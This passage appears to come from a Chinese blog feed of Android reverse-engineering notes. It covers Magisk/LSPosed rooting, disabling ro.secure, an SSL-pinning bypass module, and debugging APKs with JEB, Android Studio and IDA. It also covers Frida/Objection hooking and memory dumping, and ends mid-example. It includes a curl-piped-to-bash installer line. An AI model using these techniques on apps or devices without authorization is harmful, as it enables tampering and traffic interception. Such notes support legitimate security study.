<p><strong>选择不要安装<code>TWRP App</code></strong></p>
<h2 id="第六步-刷入LSPosed">第六步 刷入LSPosed<a class="header-anchor" href="#第六步-刷入LSPosed"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push LSPosed-v1.8.2-6519-zygisk-release.zip /sdcard/Download/</span><br></pre></td></tr></table></figure>
<p>Magisk设置中开启Zygisk，Magisk刷入LSPosed-zygisk-release.zip</p>
<p>或者Magisk先安装Riru模块，再Magisk刷入LSPosed-riru-release.zip</p>
<h2 id="模块">模块<a class="header-anchor" href="#模块"> ¶ </a></h2>
<p>Magisk模块仓库：<a href="https://github.com/Fox2Code/FoxMagiskModuleManager">Fox2Code/FoxMagiskModuleManager at 0.4.4 (github.com)</a></p>
<h3 id="Magisk模块">Magisk模块<a class="header-anchor" href="#Magisk模块"> ¶ </a></h3>
<p>MagiskHide Props Config：修改属性值</p>
<h3 id="Xposed模块">Xposed模块<a class="header-anchor" href="#Xposed模块"> ¶ </a></h3>
<p>JustTrustMePlush：SSL校验</p>
<h2 id="其他初始化设置">其他初始化设置<a class="header-anchor" href="#其他初始化设置"> ¶ </a></h2>
<h3 id="修改可调试ro-debuggable标志位">修改可调试ro.debuggable标志位<a class="header-anchor" href="#修改可调试ro-debuggable标志位"> ¶ </a></h3>
<p>root权限下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">magisk resetprop ro.debuggable 1</span><br><span class="line"><span class="comment">#查看ro.debuggable</span></span><br><span class="line">getprop ro.debuggable</span><br></pre></td></tr></table></figure>
<p>重启后失效</p>
<h4 id="使用Magisk插件MagiskHide-Props-Config">使用Magisk插件MagiskHide Props Config<a class="header-anchor" href="#使用Magisk插件MagiskHide-Props-Config"> ¶ </a></h4>
<p>props命令运行，执行<code>Add/edit custom props (active)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ro.secure=0</span><br><span class="line"></span><br><span class="line">ro.adb.secure=0</span><br><span class="line"></span><br><span class="line">ro.debuggable=1</span><br></pre></td></tr></table></figure>
<h3 id="adbd具有root权限">adbd具有root权限<a class="header-anchor" href="#adbd具有root权限"> ¶ </a></h3>
<p>[<a href="https://forum.xda-developers.com/t/2014-11-10-root-adbd-insecure-v2-00.1687590/">2014.11.10][ROOT] adbd Insecure v2.00 | XDA Forums (xda-developers.com)</a></p>
<p>配合上述修改属性值，运行apk修改设置</p>
<blockquote>
<p>虽然adb root可以运行了，但adb shell还是shell权限？</p>
</blockquote>
<h3 id="解决网络受限、修改NTP服务器">解决网络受限、修改NTP服务器<a class="header-anchor" href="#解决网络受限、修改NTP服务器"> ¶ </a></h3>
<p>root身份执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">settings delete global captive_portal_https_url</span><br><span class="line">settings delete global captive_portal_http_url</span><br><span class="line">settings put global captive_portal_https_url https://connect.rom.miui.com/generate_204</span><br><span class="line">settings put global captive_portal_http_url http://connect.rom.miui.com/generate_204</span><br><span class="line">setprop persist.sys.timezone Asia/Shanghai</span><br><span class="line">settings put global ntp_server ntp1.aliyun.com</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>captive_portal_http_url地址也可选谷歌的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://www.google.cn/generate_204</span><br></pre></td></tr></table></figure>
<p>ntp_server也可填</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.hk.pool.ntp.org</span><br></pre></td></tr></table></figure>
<h2 id="其他">其他<a class="header-anchor" href="#其他"> ¶ </a></h2>
<h3 id="手机wifi调试软件">手机wifi调试软件<a class="header-anchor" href="#手机wifi调试软件"> ¶ </a></h3>
<p><a href="https://apkpure.com/wifi-adb-debug-over-air/com.ttxapps.wifiadb">WiFi ADB for Android - APK Download (apkpure.com)</a></p>
<p>可以让设备同时连接多台主机或虚拟机</p>
<h3 id="手机终端软件Termux">手机终端软件Termux<a class="header-anchor" href="#手机终端软件Termux"> ¶ </a></h3>
<p>Termux可以模拟Linux，允许输入终端命令</p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android APK无源码动态调试合集</title>
    <url>/AndroidReverse/2022/Android_dynamic_debugging_collection/</url>
    <content><![CDATA[<h1 id="Android动态调试合集">Android动态调试合集<a class="header-anchor" href="#Android动态调试合集"> ¶ </a></h1>
<p>[TOC]</p>
<h2 id="JEB动态调试smali">JEB动态调试smali<a class="header-anchor" href="#JEB动态调试smali"> ¶ </a></h2>
<ol>
<li>
<p>选中smali代码后，<code>Ctrl B</code>下断点</p>
</li>
<li>
<p>启动app</p>
<ol>
<li>
<p>以debug模式启动Activity（调试一启动就执行的方法）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n [package_name]/[activity_name]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>调试可以手动触发(不着急)的方法，手动打开app或者去掉上述命令的<code>-D</code>参数</p>
</li>
</ol>
</li>
<li>
<p>JEB附加进程</p>
<ol>
<li>菜单栏【调试器】下选择【开始】（<strong>不能开启ddms或AndroidStudio</strong>）</li>
<li>弹出对话框，选择设备、进程后，点击【附上】。app会被附加，运行到断点断下。</li>
</ol>
</li>
</ol>
<h2 id="使用AndroidStudio配合Smalidea插件来动态调试smali">使用AndroidStudio配合Smalidea插件来动态调试smali<a class="header-anchor" href="#使用AndroidStudio配合Smalidea插件来动态调试smali"> ¶ </a></h2>
<ol>
<li>Smalidea安装
<ol>
<li>github地址：<a href="https://github.com/JesusFreke/smalidea">JesusFreke/smalidea: smalidea is a smali language plugin for IntelliJ IDEA (github.com)</a></li>
<li>下载后在插件页导入安装即可</li>
<li>配置及使用：
<ol>
<li>(0.6版本已可以自动配置)检查<code>Settings</code>-&gt;<code>Editor</code>-&gt;<code>File Types</code>中，除了<code>Smali</code>外多了一个<code>smali Files</code>，内有内容<code>*.smali</code></li>
<li>菜单栏<code>File</code>下多了<code>【Profile or Debug Apk】</code>；可以方便的选择一个apk来反编译成项目、或使用<code>apktool d</code>反编译然后导入也可以</li>
</ol>
</li>
</ol>
</li>
<li>获得反编译apk后的smali文件夹
<ol>
<li>方法一：<code>apktool d</code>反编译apk得到文件夹</li>
<li>方法二：使用菜单栏<code>File</code>下的<code>【Profile or Debug Apk】</code></li>
</ol>
</li>
</ol>
<p>方法一：</p>
<ol>
<li>
<p>AS准备调试</p>
<ol>
<li>使用AndroidStudio选择**【Import Project(导入项目)】**，并选择该文件夹；会提示不是项目，然后选择创建新项目</li>
<li>添加运行配置<code>【Add Configuration...】</code>
<ol>
<li>选择模板<code>【Remote JVM Debug】</code>，端口设置为8700</li>
</ol>
</li>
<li>设置反编译后文件夹的<strong>根目录</strong>，右键，<code>【Mark Directory as】</code>选择<code>【Sources Root】</code> （貌似可选）</li>
<li>在smali相应处下断点</li>
</ol>
</li>
<li>
<p>开始调试</p>
<ol>
<li>
<p>点击【运行】右侧的【调试】按钮，程序开始运行，运行到断点断下</p>
</li>
<li>
<p>左上角选择【停止】按钮左侧的【Attach Debugger to Android Process】附加按钮</p>
<ol>
<li>
<p>以debug模式启动Activity（调试一启动就执行的方法）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n [package_name]/[activity_name]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>转发app运行端口到<code>8700</code>（可选）</p>
<ol>
<li>
<p>命令方式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:8700 jdwp:[app_port]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用ddms(monitor)；位于<code>Sdk\tools\monitor.bat</code>(需下载)</p>
<ol>
<li>打开monitor，选中app包名所在进程，该进程的port后会出现<code>/8700</code></li>
</ol>
</li>
</ol>
</li>
<li>
<p>点击【附加】按钮选择设备下的进程，点击OK，即可开始调试</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>方法二：</p>
<p>可直接【运行】、【调试】、【附加】</p>
<h2 id="IDA动态调试so">IDA动态调试so<a class="header-anchor" href="#IDA动态调试so"> ¶ </a></h2>
<ul>
<li>
<p>IDA修改默认监听端口号（<code>-p</code>参数）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./server -p 12345</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="调试app一启动就执行的native函数">调试app一启动就执行的native函数<a class="header-anchor" href="#调试app一启动就执行的native函数"> ¶ </a></h3>
<p>如<code>JNI_OnLoad</code>、<code>.init_proc</code>或<code>.init_array</code>等</p>
<p>调试此类函数需要以debug模式启动app</p>
<ol>
<li>
<p>启动<code>android_server</code></p>
<ol>
<li>复制<code>IDA\dbgsrv\</code>下的对应的<code>android_server</code>到手机的如<code>/data/local/tmp/</code>目录下，并给予执行权限</li>
<li>在<code>su</code>下运行server启动监听</li>
</ol>
</li>
<li>
<p>开启端口转发（将设备与客户机间的23946端口连通</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以debug模式启动Activity</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n [package_name]/[activity_name]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>转发app运行端口到<code>8700</code>（可选，详见【步骤6】）</p>
<ol>
<li>
<p>命令方式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:8700 jdwp:[app_port]</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用ddms(monitor)；位于<code>Sdk\tools\monitor.bat</code>(需下载)</p>
<ol>
<li>打开monitor，选中app包名所在进程，该进程的port后会出现<code>/8700</code></li>
</ol>
</li>
</ol>
</li>
<li>
<p>IDA准备、附加进程</p>
<ol>
<li>IDA载入so，在native方法所需处下断点（可选）</li>
<li>配置调试器选项
<ol>
<li>选择调试器<code>[Remote ARM Linux/ Android debugger]</code></li>
<li>菜单栏<code>[Debugger]</code>下<code>[Process options]</code>中，配置主机为<code>localhost</code>或<code>127.0.0.1</code>(即本机)，端口为默认<code>23946</code>(同server监听端口)</li>
<li>菜单栏<code>[Debugger]</code>下<code>[Debugger options]</code>中，可根据需要勾选<code>Suspend on process entry point</code>,<code>Suspend on thread start/exit</code>,<code>Suspend on library load/unload</code></li>
</ol>
</li>
<li>附加进程
<ol>
<li>选择菜单栏<code>[Debugger]</code>下<code>[Attach to process]</code>，之后弹出一个可调试应用包名的窗口，<code>ctrl F</code>可以搜索，选择调试的应用包名，点击<code>OK</code>进行附加</li>
</ol>
</li>
</ol>
</li>
<li>
<p><code>jdwp</code>使app开始运行，此处的<code>8700</code>为【步骤4】中转发端口（若未执行步骤4，可使用ddms的最后一列数字）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>返回IDA，</p>
<ol>
<li>
<p>寻找加载的so</p>
<ol>
<li>
<p><strong>如果在【步骤5.2.3】中勾选了中断设置</strong>，先查看<code>module</code>窗口(ctrl+s)是否加载了所需的so，如果没有、需要F9运行程序再次查看，如此反复（或者查看IDA是否弹出【same】对话框？）</p>
<p>如果没有勾选，F9运行则会直接弹出same对话框（记得在【步骤5.1】下断点）；确定后<strong>会卡住一段时间</strong></p>
</li>
<li>
<p>加载时，IDA会询问远程的so文件与本地的是否相同，选择【same】（选择后，so文件就被加载进来了）</p>
</li>
<li>
<p>加载后，双击so的module，会弹出module方法窗口，选择相应的方法如<code>JNI_onLoad</code>，并在相应地址如函数开头下断点</p>
</li>
</ol>
</li>
<li>
<p>当被调试so加载进来并且下好断点后，F9运行，即可断在<code>JNI_onLoad</code>开头处</p>
</li>
</ol>
</li>
<li>
<p>完成，可以愉快的调试啦。记得<em>根据需要</em>取消【步骤5.2.3】，不然会一直断下</p>
</li>
</ol>
<h3 id="调试可以手动触发的函数">调试可以手动触发的函数<a class="header-anchor" href="#调试可以手动触发的函数"> ¶ </a></h3>
<p>自然也可以按照上面那种方式，但是比较慢，因为app要加载</p>
<p>或者</p>
<ol>
<li>【如上步骤1】</li>
<li>【如上步骤2】</li>
<li>手动启动app，<strong>或</strong>命令<code>adb shell am start -n [package_name]/[activity_name]</code>(即去掉<code>-D</code>参数)</li>
<li>【如上步骤5】，一般不需要【步骤5.2.3】（根据自己情况）</li>
<li>【步骤4】附加完成后，会弹出【same】窗口，之后点击运行、触发断点，即可开始调试</li>
</ol>
<h2 id="错误踩坑解决">错误踩坑解决<a class="header-anchor" href="#错误踩坑解决"> ¶ </a></h2>
<h3 id="Smalidea调试">Smalidea调试<a class="header-anchor" href="#Smalidea调试"> ¶ </a></h3>
<h4 id="【附加】时无设备或进程">【附加】时无设备或进程<a class="header-anchor" href="#【附加】时无设备或进程"> ¶ </a></h4>
<p>没有设备进程供选择，点击菜单栏【File】的【Invalidate Caches / Restart…】来清理缓存并重新启动AS</p>
<h3 id="DDMS">DDMS<a class="header-anchor" href="#DDMS"> ¶ </a></h3>
<h4 id="DDMS总是启动失败">DDMS总是启动失败<a class="header-anchor" href="#DDMS总是启动失败"> ¶ </a></h4>
<ul>
<li>切换java版本为<code>1.8</code></li>
<li><strong>或者</strong>，拷贝java1.8的<code>jre</code>一份，放到<code>Sdk\tools\lib\monitor-x86_64\jre</code></li>
</ul>
<h2 id="此外-2">此外<a class="header-anchor" href="#此外-2"> ¶ </a></h2>
<h3 id="debuggable属性">debuggable属性<a class="header-anchor" href="#debuggable属性"> ¶ </a></h3>
<h4 id="app在清单中添加debuggable属性">app在清单中添加debuggable属性<a class="header-anchor" href="#app在清单中添加debuggable属性"> ¶ </a></h4>
<p>在<code>AndroidManifest.xml</code>的<code>application</code>标签中添加<code>android:debuggable=&quot;true&quot;</code></p>
<h3 id="修改设备的ro-debuggable-1">修改设备的<code>ro.debuggable=1</code><a class="header-anchor" href="#修改设备的ro-debuggable-1"> ¶ </a></h3>
<h4 id="安装magisk后">安装magisk后<a class="header-anchor" href="#安装magisk后"> ¶ </a></h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">magisk resetprop ro.debuggable 1</span><br><span class="line">magisk resetprop ro.secure 0</span><br><span class="line">magisk resetprop ro.adb.secure 0</span><br></pre></td></tr></table></figure>
<p>重启设备后失效</p>
<h4 id="magisk安装MagiskHide-Props-Config模块">magisk安装<code>MagiskHide Props Config</code>模块<a class="header-anchor" href="#magisk安装MagiskHide-Props-Config模块"> ¶ </a></h4>
<p>主页：<a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf/">Magisk-Modules-Repo/MagiskHidePropsConf: MagiskHidePropsConf (github.com)</a></p>
<p>使用命令<code>props</code>来修改</p>
<p>选择<code>3 - Edit MagiskHide props</code></p>
<p>根据需要修改相应ro标志位</p>
<p>之后需要重启手机</p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>过程记录备查</category>
      </categories>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida all in one</title>
    <url>/AndroidReverse/2022/Frida_all_in_one/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="Frida-all-in-one">Frida all in one<a class="header-anchor" href="#Frida-all-in-one"> ¶ </a></h1>
<p>努力ALL IN ONE，部分代码可配合<a href="https://github.com/Forgo7ten/AndroidReversePractice/tree/main/FridaTestApp">AndroidReversePractice/FridaTestApp at main · Forgo7ten/AndroidReversePractice (github.com)</a>试验。</p>
<p><a href="https://frida.re/docs/javascript-api/">JavaScript API | Frida • A world-class dynamic instrumentation framework</a></p>
<h2 id="Frida环境与基础使用">Frida环境与基础使用<a class="header-anchor" href="#Frida环境与基础使用"> ¶ </a></h2>
<h3 id="多python-frida版本切换">多python frida版本切换<a class="header-anchor" href="#多python-frida版本切换"> ¶ </a></h3>
<h4 id="pyenv安装">pyenv安装<a class="header-anchor" href="#pyenv安装"> ¶ </a></h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://gitee.com/ibopo//pyenv-installer/raw/master/bin/pyenv-installer | bash</span><br><span class="line"><span class="built_in">cd</span> ~/.pyenv &amp;&amp; src/configure &amp;&amp; make -C src</span><br></pre></td></tr></table></figure>
<p>.bashrc添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pyenv start</span></span><br><span class="line"><span class="built_in">export</span> PYENV_ROOT=<span class="string">&quot;<span class="variable">$HOME</span>/.pyenv&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PYENV_ROOT</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PYENV_ROOT</span>/shims:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">command</span> -v pyenv 1&gt;/dev/null 2&gt;&amp;1; <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(pyenv init -)</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(pyenv virtualenv-init -)</span>&quot;</span></span><br><span class="line"><span class="comment"># pyenv end</span></span><br></pre></td></tr></table></figure>
<h4 id="pyenv使用">pyenv使用<a class="header-anchor" href="#pyenv使用"> ¶ </a></h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载python版本3.8.2</span></span><br><span class="line">pyenv install 3.8.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看pyenv版本</span></span><br><span class="line">pyenv versions</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换某个python版本</span></span><br><span class="line">pyenv <span class="built_in">local</span> 3.8.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到系统python版本</span></span><br><span class="line">python <span class="built_in">local</span> system</span><br></pre></td></tr></table></figure>
<h3 id="Frida环境安装">Frida环境安装<a class="header-anchor" href="#Frida环境安装"> ¶ </a></h3>
<p>需前往<a href="https://pypi.org/project/frida/#files">frida · PyPI</a>查看支持python版本（如frida 15.0.13不支持python3.7）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure>
<p>安装特定版本</p>
<p><strong>需要使用3.8.2</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">### Python3.8.2 ###</span></span><br><span class="line">pyenv <span class="built_in">local</span> 3.8.2</span><br><span class="line">pip install wheel</span><br><span class="line">pip install frida==12.8.0</span><br><span class="line">pip install frida-tools==5.3.0</span><br><span class="line">pip install objection==1.8.4</span><br><span class="line"><span class="comment">### Python3.8.5 ###</span></span><br><span class="line">pyenv loacal 3.8.5</span><br><span class="line">pip install frida==14.2.18</span><br><span class="line">pip install frida-tools==9.2.4</span><br><span class="line">pip install objection==1.11.0</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/frida/frida/releases/tag/12.8.0">Release Frida 12.8.0 · frida/frida (github.com)</a></p>
<p>[Release Frida 14.2.18 · frida/frida (<a href="http://github.com">github.com</a>)](</p>
<h4 id="手机环境配置">手机环境配置<a class="header-anchor" href="#手机环境配置"> ¶ </a></h4>
<p>前往<a href="https://github.com/frida/frida/releases/">Releases · frida/frida (github.com)</a>下载对应的<code>frida-server</code>文件，<strong>frida-server版本要和frida版本一致</strong></p>
<p>push到设备目录，赋予执行权限</p>
<h5 id="监听">监听<a class="header-anchor" href="#监听"> ¶ </a></h5>
<p>设置端口号为8888</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./frida -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure>
<h3 id="Objection环境安装">Objection环境安装<a class="header-anchor" href="#Objection环境安装"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install objection</span><br></pre></td></tr></table></figure>
<h3 id="Frida开发环境搭建">Frida开发环境搭建<a class="header-anchor" href="#Frida开发环境搭建"> ¶ </a></h3>
<blockquote>
<p>全局获得代码提示（在用户根目录使用）</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save @types/frida-gum</span><br><span class="line"><span class="comment"># --save到当前目录</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>或者ts编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/Forgo7ten/frida-agent-example.git</span><br><span class="line"><span class="built_in">cd</span> frida-agent-example/</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p>在<code>agent</code>目录下编写</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** test.js **/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Hello Frida&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<p>控制台执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">frida -H 192.168.0.106:8888 -f com.android.settings -l test.js --no-pause</span><br><span class="line"></span><br><span class="line">-H：设置主机和端口号</span><br><span class="line">-f：启动某个应用（packagename）</span><br><span class="line">-l：执行的js文件</span><br></pre></td></tr></table></figure>
<ul>
<li><code>npm run watch</code>会监控代码修改自动编译生成js文件</li>
</ul>
<p><strong>或者</strong>python脚本执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># loader.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定 UID/远程 设备</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&quot;192.168.0.103:8888&quot;</span>)</span><br><span class="line"><span class="comment"># 寻找某apk包名</span></span><br><span class="line">pid = device.spawn(<span class="string">&quot;com.android.settings&quot;</span>)</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 创建js脚本</span></span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># 加载js脚本</span></span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure>
<h3 id="Objection使用">Objection使用<a class="header-anchor" href="#Objection使用"> ¶ </a></h3>
<h4 id="Objection基本使用">Objection基本使用<a class="header-anchor" href="#Objection基本使用"> ¶ </a></h4>
<p>objection启动并注入内存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objection -N -h [hostname] -p [port] -d -g [packagename] explore</span><br><span class="line"><span class="comment"># -N 指定网络连接</span></span><br><span class="line"><span class="comment"># -h 指定主机名</span></span><br><span class="line"><span class="comment"># -p 指定端口</span></span><br><span class="line"><span class="comment"># -d 启用debug模式</span></span><br><span class="line"><span class="comment"># -g 打开的app包名</span></span><br></pre></td></tr></table></figure>
<p><strong>memory</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看内存中加载的库</span></span><br><span class="line">memory list modules</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看库的导出函数</span></span><br><span class="line">memory list exports [modulename]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果保存到文件（以json形式）</span></span><br><span class="line">memory list exports [modulename] --json [filename]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提取整个内存</span></span><br><span class="line">memory dump all [filename]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取部分内存</span></span><br><span class="line">memory dump from_base [start_addr] [length] [file_name]</span><br></pre></td></tr></table></figure>
<p><strong>android</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索类的实例</span></span><br><span class="line">android heap search instances [class_name]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主动调用实例方法</span></span><br><span class="line">android heap execute [instance_handle] [method_name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在实例上执行js代码</span></span><br><span class="line">android heap evaluate [instance_handle] &#123;Enter&#125;</span><br><span class="line"><span class="comment">## 输入js代码 ## (clazz代表当前类 )</span></span><br></pre></td></tr></table></figure>
<p><strong>启动activity或service</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动activity</span></span><br><span class="line">android intent launch_activity [activity]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动service</span></span><br><span class="line">android intent launch_service [service]</span><br></pre></td></tr></table></figure>
<p><strong>hooking</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看内存中的activity</span></span><br><span class="line">android hooking list activities</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看内存中的service</span></span><br><span class="line">android hooking list services</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看内存中所有的类</span></span><br><span class="line">android hooking list classes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出某个类的所有方法</span></span><br><span class="line">android hooking list class_methods [class]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搜索包含特定关键词的类</span></span><br><span class="line">android hooking search classes [string]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内存中搜索包含特定关键词的方法</span></span><br><span class="line">android hooking search methods [string]</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成该类所有方法的hook，每次调用都会被log</span></span><br><span class="line">android hooking generate simple [class]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 附带参数：额外打印参数，调用栈，返回值</span></span><br><span class="line">android hooking watch class [class_method] --dump-args --dump-backtrace --dump-return</span><br><span class="line"></span><br><span class="line"><span class="comment"># hook某方法(同时会hook所有重载)</span></span><br><span class="line">android hooking watch [class_method] [method_name]</span><br></pre></td></tr></table></figure>
<p><strong>objection jobs</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看jobs列表（当有hook任务时）</span></span><br><span class="line"><span class="built_in">jobs</span> list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除任务 JobID通过list得到</span></span><br><span class="line"><span class="built_in">jobs</span> <span class="built_in">kill</span> [JobID]</span><br></pre></td></tr></table></figure>
<h4 id="objection插件">objection插件<a class="header-anchor" href="#objection插件"> ¶ </a></h4>
<p>插件使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugin load [FileUrl]</span><br></pre></td></tr></table></figure>
<h4 id="Wallbreaker"><a href="https://github.com/hluwa/Wallbreaker">Wallbreaker</a><a class="header-anchor" href="#Wallbreaker"> ¶ </a></h4>
<h4 id="FRIDA-DEXDump"><a href="https://github.com/hluwa/FRIDA-DEXDump">FRIDA-DEXDump</a><a class="header-anchor" href="#FRIDA-DEXDump"> ¶ </a></h4>
<h4 id="objection高级使用">objection高级使用<a class="header-anchor" href="#objection高级使用"> ¶ </a></h4>
<p>objection spawn进程（hook某些一启动就执行的app）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objection -d -g [packageName] explore --startup-command <span class="string">&#x27;android hooking watch class xxx&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objection -d -g [packageName] explore -c commands.txt</span><br></pre></td></tr></table></figure>
<h2 id="Frida-Java层应用">Frida Java层应用<a class="header-anchor" href="#Frida-Java层应用"> ¶ </a></h2>
<h3 id="hook方法">hook方法<a class="header-anchor" href="#hook方法"> ¶ </a></h3>
<h4 id="hook静态方法与实例方法">hook静态方法与实例方法<a class="header-anchor" href="#hook静态方法与实例方法"> ¶ </a></h4>
<p>Frida对静态方法与实例方法没有区分，直接hook即可。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 先查找HookedObject类，然后hook其的stringTwo方法</span></span><br><span class="line">            Java.use(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).stringTwo.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">arg</span>) </span>&#123;</span><br><span class="line">              <span class="comment">// this为当前实例，获得原方法执行的结果</span></span><br><span class="line">              <span class="keyword">var</span> result = <span class="built_in">this</span>.stringTwo(arg);</span><br><span class="line">              <span class="comment">// 打印参数和原方法结果</span></span><br><span class="line">              <span class="built_in">console</span>.log(<span class="string">&quot;stringTwo arg,result: &quot;</span>, arg, result);</span><br><span class="line">              <span class="comment">// 对方法的结果进行修改（相当于重写了该方法）</span></span><br><span class="line">              <span class="keyword">return</span> Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;hhello&quot;</span>);</span><br><span class="line">            &#125;;</span><br><span 